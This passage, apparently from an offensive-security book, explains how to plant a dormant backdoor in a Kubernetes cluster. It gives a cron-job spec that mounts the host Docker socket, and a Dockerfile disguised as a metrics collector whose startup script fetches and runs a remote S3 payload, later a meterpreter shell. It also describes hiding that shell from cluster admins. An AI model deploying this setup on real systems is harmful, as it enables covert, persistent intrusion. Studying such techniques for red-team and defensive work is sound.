```
spec:
  template:
    spec:
      containers:
        - name: metrics-collect
          image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector
          volumeMounts:
            - mountPath: /var/run/docker.sock
              name: dockersock
      volumes:
        - name: dockersock
          hostPath:
            path: /var/run/docker.sock
      restartPolicy: Never
```

# Listing 9-6: The cron job for our stealthy backdoor

This cron job loads the amazon-metrics-collector image from yet another AWS account we control. This Docker image has a thicker structure and may even pass for a legit metrics job (see Listing 9-7).

```
# Dockerfile

FROM debian: buster-slim

RUN apt update && apt install -y git make
RUN apt install -y prometheus-varnish-exporter
COPY init.sh /var/run/init.sh

ENTRYPOINT ["/var/run/init.sh"]
```

# Listing 9-7: A Dockerfile installing a number of packages and executing a script on startup

Behind the façade of useless packages and dozens of dummy lines of code, deep inside init.sh, we place an instruction that downloads and executes our custom script hosted on S3. At first, this remote script will be a harmless dummy echo command. The moment we want to activate this backdoor to regain access to the system, we overwrite the file on S3 with our custom meterpreter. It's a sort of dormant shell that we only use in case of emergency.

This setup, however, will not completely solve the original problem of visibility. Once we activate our shell, we will have a pod constantly running on the system, visible to every Kube admin.

One optimization is to avoid executing our custom stager directly on the foreign container metrics-collector pod. Instead, we will use this pod to contact the Docker socket that we so conveniently mounted and instruct it to start yet another container on the host, which will in time load the meterpreter agent. The metrics-collector pod, having done its job, can gracefully terminate, while our shell remains running unhindered in its own second container.